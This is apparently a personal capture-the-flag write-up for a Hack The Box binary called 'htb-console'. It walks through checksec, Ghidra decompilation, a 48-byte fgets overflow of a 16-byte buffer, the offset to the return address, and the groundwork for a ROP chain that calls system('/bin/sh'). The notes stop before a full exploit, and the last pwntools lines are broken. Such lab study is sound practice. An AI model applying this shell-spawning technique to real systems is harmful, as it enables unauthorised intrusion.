htb-console

NX is enabled
No obvious flag or win function
I think we'll need to do some ROP magic to get a shell

$ file htb-console           
htb-console: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=575e4055094a7f059c67032dd049e4fdbb171266, for GNU/Linux 3.2.0, stripped

$ checksec --file htb-console
[*] '/home/kali/CTF/HTB/HTB_Console/htb-console'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


- Open in Ghidra
- stripped, so no function names
- also, there is an alert / alarm

void alarm(void)

{
  alarm(0x1e);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  return;
}

- alarm is set to 0x1e (30 seconds)
- lets open the exe in ghex and replace this with 0xff

ghex htb-console
find / replace bf 1e with bf ff
save as htb-console-patched


iVar1 = strcmp(param_1,"flag\n");
if (iVar1 == 0) {
printf("Enter flag: ");
fgets(local_18,0x30,stdin);
puts("Whoops, wrong flag!");
}

local_18 in this function is a buffer of size 16
but fgets here allows user to input 0x30 (48) bytes of info .. which will overflow the buffer

If we look further down:
          else {
            iVar1 = strcmp(param_1,"date\n");
            if (iVar1 == 0) {
              system("date");

Application calls 'system' which perhaps we can exploit to call a shell.

Remember that PIE is not enabled ... so we don't have to worry about the memory addresses
changing.

pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401030  puts@plt
0x0000000000401040  system@plt

Could also use radare2 from within gdb-pwndbg:
pwndbg> r2
[0x004010b0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x004010b0]> afl
0x004010b0    1 47           entry0
0x00401030    1 6            sym.imp.puts
0x00401040    1 6            sym.imp.system
0x00401050    1 6            sym.imp.printf
0x00401060    1 6            sym.imp.memset
0x00401070    1 6            sym.imp.alarm
0x00401080    1 6            sym.imp.fgets
0x00401090    1 6            sym.imp.strcmp
0x004010a0    1 6            sym.imp.setvbuf
0x00401397    2 107          main
0x00401190    5 118  -> 57   entry.init0
0x00401160    3 33   -> 32   entry.fini0
0x004010f0    4 33           fcn.004010f0


Need offst to the instruction pointer so we can overwrite it with address of system and pass it our own string.

- open gdb-pwndbg.
- Generate cyclic pattern (cyclic 50)

Now we'll attempt to overflow the buffer in the 'flag' option:
>> flag
>> (enter the cyclic pattern)

Now look for the 8 bytes contained in RSP (which would normally be copied into the RIP):
search for them:
pwndbg> cyclic -l daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24

Now to figure out how / where we'll write our string (/bin/sh) to be called by system
the hof function allows us to input a string which is stored in a DATA variable.
Lets figure out where this is stored:

in gdb-pwndbg, run the program, then call 'hof'
>> /bin/sh
now, ctrl-c to break out of execution.

in Ghidra, we see that user input is read into DAT_004040b0
If we look at this variable, we find it's address:

                             DAT_004040b0                                    XREF[1]:     console:004012f1(*)  
        004040b0 00              ??         00h


Back in gdb-pwndbg, lets have a look at whats in this variable / address:
x/8s 0x004040b0
0x4040b0:	"/bin/sh\n"
0x4040b9:	""
0x4040ba:	""
0x4040bb:	""
0x4040bc:	""
0x4040bd:	""
0x4040be:	""
0x4040bf:	""

Voila!  We see our string right there!

So we will need to find pop rdi in order to pop the bin/sh string before we call system
$ ropper --file htb-console --search "pop rdi"   
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: htb-console


Now we need to figure out how to write our '/bin/sh/'' string to the data variable 
io.sendlineafter('>> ', 'hof')
io.sendlineafter('Enter your name: ', '/bin/sh/)
